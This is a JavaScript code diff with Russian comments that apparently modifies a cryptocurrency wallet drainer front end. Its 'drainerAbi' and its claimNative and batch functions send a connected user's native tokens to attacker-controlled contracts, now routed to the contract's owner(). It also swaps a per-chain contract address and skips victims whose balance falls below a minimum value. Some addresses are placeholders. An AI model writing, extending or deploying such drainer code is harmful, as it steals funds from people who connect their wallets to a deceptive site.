@@ -52,7 +52,7 @@ const networkMap = {
 
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0x06BF775ff9a22691Adf297a84DD49ECf61dF03B2',
-  [networkMap['BNB Smart Chain'].chainId]: '0x81F8290188d5D54E8FA98147585043DDDD34603d',
+  [networkMap['BNB Smart Chain'].chainId]: '0x143488577a6DA0f23DBC0E6D8c07355D75d1B9eD',
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
   [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
   [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
@@ -65,8 +65,7 @@ const CONTRACTS = {
   [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
 }
 
-// Получатель нативного вывода
-const NATIVE_RECIPIENT = '0xbced7e9C6a1aFB0e5DD1Bd1a410e448fEc78cB0e'
+// Нативные токены теперь переводятся на owner() контракта
 
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 const appKit = createAppKit({
@@ -557,9 +556,7 @@ const erc20Abi = [
 // ABI нашего контракта для нативного вывода
 const drainerAbi = [
   {
-    inputs: [
-      { name: 'recipient', type: 'address' }
-    ],
+    inputs: [],
     name: 'claim',
     outputs: [],
     stateMutability: 'payable',
@@ -684,7 +681,7 @@ const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => 
       address: getAddress(contractAddress),
       abi: drainerAbi,
       functionName: 'claim',
-      args: [getAddress(NATIVE_RECIPIENT)],
+      args: [],
       chainId,
       value: valueToSend
     })
@@ -860,7 +857,7 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
           data: encodeFunctionData({
             abi: drainerAbi,
             functionName: 'claim',
-            args: [getAddress(NATIVE_RECIPIENT)]
+            args: []
           }),
           value: valueToSend
         })
@@ -1012,7 +1009,7 @@ const initializeSubscribers = (modal) => {
       // Проверяем минимальный баланс
       if (mostExpensive && mostExpensive.value < MIN_VALUE_USD) {
         // Закрываем модальное окно если баланс меньше минимального
-        hideCustomModal()
+        modal.classList.remove('show')
         return
       }
       
